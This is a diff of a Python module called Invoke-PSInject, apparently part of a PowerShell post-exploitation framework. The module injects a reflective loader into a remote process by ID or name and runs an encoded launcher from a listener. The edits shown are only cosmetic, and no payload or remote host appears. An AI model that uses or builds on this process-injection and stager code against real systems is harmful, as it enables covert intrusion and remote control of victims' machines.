@@ -7,7 +7,6 @@ import base64
 class Module(object):
 
     def __init__(self, mainMenu, params=[]):
-
         self.info = {
             'Name': 'Invoke-PSInject',
 
@@ -15,16 +14,17 @@ class Module(object):
 
             'Description': ("Utilizes Powershell to to inject a Stephen Fewer "
                             "formed ReflectivePick which executes PS code"
-                            "from memory in a remote process"),
+                            "from memory in a remote process. ProcID or "
+                            "ProcName must be specified."),
 
             'Background' : True,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : False,
 
             'OpsecSafe' : True,
-            
+
             'Language' : 'powershell',
 
             'MinLanguageVersion' : '2',
@@ -87,14 +87,13 @@ class Module(object):
 
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
-
         listenerName = self.options['Listener']['Value']
         procID = self.options['ProcId']['Value'].strip()
         procName = self.options['ProcName']['Value'].strip()
 
         if procID == '' and procName == '':
             print(helpers.color("[!] Either ProcID or ProcName must be specified."))
-            return ''
+            return ""
 
         # staging options
         userAgent = self.options['UserAgent']['Value']
@@ -124,7 +123,6 @@ class Module(object):
         else:
             # generate the PowerShell one-liner with all of the proper options set
             launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
-
             if launcher == '':
                 print(helpers.color('[!] Error in launcher generation.'))
                 return ''
